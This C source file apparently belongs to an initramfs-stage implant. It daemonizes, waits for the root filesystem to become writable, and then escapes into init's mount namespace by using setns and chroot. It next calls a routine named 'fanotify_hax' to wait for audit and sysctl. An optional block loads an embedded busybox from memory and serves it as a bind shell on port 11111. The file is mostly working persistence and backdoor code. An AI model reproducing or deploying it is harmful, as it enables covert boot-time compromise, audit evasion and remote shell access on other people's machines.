#define _GNU_SOURCE

#include "mlog.h"
#include "loader.h"
#include "fanotify_hax.h"
#include "find_audit.h"


#include <sched.h>
#include <sys/mount.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/personality.h>

#include <sys/mman.h>
#include <linux/memfd.h>

#include <errno.h>
#include <stdio.h>
#include <poll.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

/* switch to 1 to have a local bind shell on 1111 */
#define EMBED_SHELL 0

/* switch to 1 to have daemon not exit */
#define HANG_AROUND 1

#if EMBED_SHELL
#include "busybox.h"
#endif

static int slash_rw(int fd, char *needle)
{
    int rc = -1;
    FILE *fp = NULL;
    char buf[256];
    char *saveptr;

    /* mlog(LINFO, "slash_rw"); */
    fp = fdopen(fd, "r");
    if (fp == NULL) {
        goto out;
    }
    rewind(fp);
    /* mlog(LINFO, "mounts begin"); */
    while (1) {
        char *c;

        if (fgets(buf, sizeof(buf), fp) == NULL) {
            goto out;
        }
        /* mlog(LINFO, '%s', buf); */
        /* /dev/mapper/ubuntu--vg-root / ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 */
        (void)strtok_r(buf, " ", &saveptr); /* device */
        c = strtok_r(NULL, " ", &saveptr); /* mount path */
        if (strncmp(c, "/", sizeof(buf)) != 0) {
            continue;
        }
        (void)strtok_r(NULL, " ", &saveptr); /* filesystem */
        c = strtok_r(NULL, " ", &saveptr); /* options path */
        mlog(LINFO, "c: %s", c);
        if (strstr(c, needle) != NULL) {
            rc = 1;
            goto out;
        }
        rc = 0;
        goto out;
    }
    /* mlog(LINFO, "mounts end"); */

 out:
    return rc;
}

static int watch_the_mounts(char *needle)
{
    int fd;
    int rc = -1;
    struct pollfd pollfds[1];

    fd = open("/proc/self/mounts", O_RDONLY);
    if (fd < 0) {
        mlog(LFAIL, "open: %s", strerror(errno));
        goto out;
    }
    pollfds[0].fd = fd;
    pollfds[0].events = POLLPRI | POLLNVAL;
    while ((rc = poll(pollfds, 1, -1))) {
        if (rc < 0) {
            if (errno == -EINTR) {
                continue;
            } else {
                mlog(LFAIL, "error in poll:%s", strerror(errno));
                goto out;
            }
        }
        if (pollfds[0].revents & POLLERR) {
            /* /proc/self/mounts has activity means that mounts have changed */
            rc = slash_rw(fd, needle);
            if (rc == 1) {
                (void)close(fd);
                goto out;
            }
        }
    }
 out:
    return rc;
}

#if EMBED_SHELL
int busyboxy()
{
    int fd = -1;

    fd = memfd_create("busybox", 1);
    if (fd < 0) {
        mlog(LFAIL, "memfd_create: %s", strerror(errno));
    } else {
        if (write(fd, _bin_busybox, _bin_busybox_len) < 0) {
            mlog(LFAIL, "write");
        }
    }
    return fd;
}
#endif

#if EMBED_SHELL
// https://gist.github.com/geyslan/5176234
static void spawn_a_shell()
{
    if (fork() == 0) {
	int resultfd, sockfd;
	int port = 11111;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);

        while (1) {
            // syscall socketcall (sys_accept 5)
            resultfd = accept(sockfd, NULL, NULL);
            if (fork() == 0) {

                // syscall 63
                dup2(resultfd, 2);
                dup2(resultfd, 1);
                dup2(resultfd, 0);

                // syscall 11
                char buf[256];
                sprintf(buf, "/proc/%u/fd/%d", getpid(), busyboxy());
                mlog(LINFO, "exec filename: %s", buf);
                int rc = execl(buf, "sh", NULL);
                if (rc < 0) {
                    mlog(LFAIL, "couldn't exec: %s", strerror(errno));
                    exit(EXIT_FAILURE);
                }
                exit(EXIT_SUCCESS);
            }
        }
        exit(EXIT_SUCCESS);
    }
}
#endif

int main(int argc, char* argv[])
{
    pid_t pid;
    pid_t sid;
    int rc;

    pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        printf("pid of child process %d \n", pid);
        exit(EXIT_SUCCESS);
    }
    umask(0);
    sid = setsid();
    if(sid < 0) {
        perror("setsid");
        goto out;
    }
    if (chdir("/") < 0) {
        perror("chdir");
        goto out;
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    (void)open("/dev/null", O_RDONLY);
    (void)open("/dev/null", O_WRONLY);
    (void)open("/dev/null", O_RDWR);

    log_init("staged2");
    mlog(LINFO, "starting up...");

    /*
     * What follows is some black magic fuckery
     *
     * What initramfs is doing is deleting all the files in the
     * initrafms, then moving the target root onto root with MS_MOVE
     *
     * Without this magic, you end up with two root filesystems at
     * once and nothing in them (WTF?!)
     *
     * Steps:
     *  1. poll on /proc/self/mounts
     *  2. sleep while initramfs finishes and init starts
     *  3. create a new mount namespace
     *  4. mount proc (it's not in initramfs)
     *  5. set mount namespace to init's namespace through setns
     *  6. chroot to init's root
     *  7. chdir to .
     *  8. chroot to /
     *
     */
    rc = watch_the_mounts("rw");
    if (rc < 0) {
        mlog(LFAIL, "coudln't watch mounts!");
        while(1) {sleep(1);}
        exit(EXIT_FAILURE);
    }
    /* we start listening at 1554601082.127037 */
    /* audit starts at       1554601082.488538 */
    /* sysctl is at          1554601082.556904 */

    /* this is super gross */
    const int ms = 100;
    mlog(LINFO, "sleeping %d ms", ms);
    usleep(ms*1000);
    mlog(LINFO, "done");

    unshare(CLONE_NEWNS);
    mkdir("/proc/", S_IRWXU);
    const int mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
    if (mount("proc", "/proc", "proc", mountflags, NULL) < 0) {
        mlog(LFAIL, "couldnt mount /proc: %s", strerror(errno));
    }

    int nsfd = open("/proc/1/ns/mnt", O_RDONLY);
    if (nsfd < 0) {
        mlog(LFAIL, "couldn't open: %s", strerror(errno));
    }
    if (setns(nsfd, CLONE_NEWNS) < 0) {
        mlog(LFAIL, "couldn't setns", strerror(errno));
    }

    rc = chroot("/proc/1/root");

    rc = chdir(".");
    rc = chroot("/");

    log_stat("/sys/firmware/efi/efivars");

    rc = personality(PER_BSD);
    if (rc) {
        perror("personality");
        exit(EXIT_FAILURE);
    }

    #if EMBED_SHELL
    mlog(LINFO, "spawn shell");
    spawn_a_shell();
    #endif

    /* next phase: use fanotify to wait for audit and sysctl */
    (void)fanotify_hax();

    #if HANG_AROUND
    while(1) {
        sleep(2);
        mlog(LINFO, "heartbeat");
    }
    #else
    sleep(3); //give us 3 seconds to finish up
    exit(EXIT_SUCCESS);
    #endif

    log_fini();
    return (0);
 out:
    exit(EXIT_FAILURE);
    return 1;
}

/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 4
 * tab-width: 8
 * indent-tabs-mode: nil
 * End:
 *
 * vi: set shiftwidth=4 tabstop=8 expandtab:
 * :indentSize=4:tabSize=8:noTabs=true:
 */
